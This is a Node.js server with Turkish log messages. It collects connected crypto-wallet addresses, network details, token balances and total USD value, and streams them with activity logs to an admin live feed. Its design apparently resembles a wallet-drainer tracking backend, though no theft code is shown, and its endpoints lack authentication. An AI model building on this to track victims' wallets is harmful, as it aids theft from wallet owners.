import express from "express";
import http from "http";
import cors from "cors";
import fs from "fs";
import path from "path";
import { fileURLToPath } from "url";
import { Server } from "socket.io";

const __filename = fileURLToPath(import.meta.url);
const __dirname = path.dirname(__filename);

const DATA_DIR = path.join(__dirname, "data");
const WALLETS_FILE = path.join(DATA_DIR, "wallets.json");
const LOGS_FILE = path.join(DATA_DIR, "logs.json");

const app = express();

app.use(cors());
app.use(express.json());

const DIST_DIR = path.join(__dirname, "dist");
if (fs.existsSync(DIST_DIR)) {
  app.use(express.static(DIST_DIR));
}

function ensureFiles() {
  if (!fs.existsSync(DATA_DIR)) fs.mkdirSync(DATA_DIR, { recursive: true });
  if (!fs.existsSync(WALLETS_FILE)) fs.writeFileSync(WALLETS_FILE, "[]");
  if (!fs.existsSync(LOGS_FILE)) fs.writeFileSync(LOGS_FILE, "[]");
}

ensureFiles();

function readJson(file) {
  try {
    return JSON.parse(fs.readFileSync(file, "utf-8"));
  } catch {
    return [];
  }
}

function saveJson(file, data) {
  fs.writeFileSync(file, JSON.stringify(data, null, 2));
}

let wallets = readJson(WALLETS_FILE);
let logs = readJson(LOGS_FILE);

function addLog(data = {}) {
  const log = {
    id: Date.now() + "-" + Math.floor(Math.random() * 999999),
    type: data.type || "info",
    title: data.title || "Yeni log",
    message: data.message || "",
    address: data.address || "",
    status: data.status || "pending",
    device: data.device || "",
    createdAt: new Date().toLocaleString(),
  };

  logs.unshift(log);
  logs = logs.slice(0, 300);
  saveJson(LOGS_FILE, logs);
  io.emit("activity_logs_updated", logs);

  return log;
}

app.get("/wallets", (req, res) => {
  res.json(wallets);
});

app.get("/activity-logs", (req, res) => {
  res.json(logs);
});

app.post("/activity-log", (req, res) => {
  const log = addLog(req.body || {});
  res.json({ success: true, log });
});

app.get("/tron-balance/:address", async (req, res) => {
  try {
    const address = req.params.address;

    const response = await fetch(
      `https://apilist.tronscanapi.com/api/account?address=${address}`
    );

    const data = await response.json();
    const trx = Number(data.balance || 0) / 1e6;

    const usdtToken = data.trc20token_balances?.find(
      (t) =>
        t.tokenAbbr === "USDT" ||
        t.tokenName === "Tether USD" ||
        t.tokenId === "TXLAQ63Xg1NAzckPwKHvzw7CSEmLMEqcdj"
    );

    const usdt = usdtToken ? Number(usdtToken.balance || 0) / 1e6 : 0;

    res.json({
      success: true,
      address,
      trx,
      usdt,
    });
  } catch (err) {
    console.log("TRON BACKEND HATA:", err);

    addLog({
      type: "error",
      title: "TRON API hata",
      message: "TRON bakiye okunamadı",
      status: "error",
    });

    res.status(500).json({
      success: false,
      error: "TRON balance okunamadı",
    });
  }
});

function createWalletData(data) {
  return {
    id: Date.now() + "-" + Math.floor(Math.random() * 999999),
    address: data.address,
    network: data.network,
    chainId: data.chainId,
    nativeBalance: data.nativeBalance || "0",
    usdtBalance: data.usdtBalance || "0.00 USDT",
    tokenBalances: data.tokenBalances || [],
    totalUsd: data.totalUsd || 0,
    createdAt: new Date().toLocaleString(),
    isNew: true,
  };
}

function addWallet(data) {
  const walletData = createWalletData(data);

  wallets = wallets.map((w) => ({
    ...w,
    isNew: false,
  }));

  wallets.unshift(walletData);
  wallets = wallets.slice(0, 50);

  saveJson(WALLETS_FILE, wallets);

  addLog({
    type: "wallet",
    title: "Yeni bağlantı",
    message: `Toplam değer: $${walletData.totalUsd || 0}`,
    address: walletData.address,
    status: "success",
  });

  return walletData;
}

app.post("/wallets", (req, res) => {
  const walletData = addWallet(req.body);

  io.emit("wallets_updated", wallets);

  res.json({
    success: true,
    wallet: walletData,
  });
});

const server = http.createServer(app);

const io = new Server(server, {
  cors: {
    origin: "*",
  },
});

io.on("connection", (socket) => {
  console.log("Socket bağlandı:", socket.id);

  socket.emit("wallets_updated", wallets);
  socket.emit("activity_logs_updated", logs);

  socket.on("wallet_connected", (data) => {
    console.log("Cüzdan geldi:", data);

    addWallet(data);

    io.emit("wallets_updated", wallets);
  });

  socket.on("client_log", (data) => {
    addLog(data);
  });

  socket.on("clear_wallets", () => {
    wallets = [];

    saveJson(WALLETS_FILE, wallets);

    addLog({
      type: "system",
      title: "Liste temizlendi",
      message: "Admin tüm cüzdanları temizledi",
      status: "pending",
    });

    io.emit("wallets_updated", wallets);
  });
});

app.get(/^\/(?!socket.io).*/, (req, res) => {
  const indexFile = path.join(DIST_DIR, "index.html");
  if (fs.existsSync(indexFile)) {
    res.sendFile(indexFile);
  } else {
    res.send("SERVER AKTİF - dist klasörü yok. Önce npm run build çalıştır.");
  }
});

const PORT = process.env.PORT || 4000;
server.listen(PORT, "0.0.0.0", () => {
  console.log(`SERVER ÇALIŞIYOR → PORT ${PORT}`);
});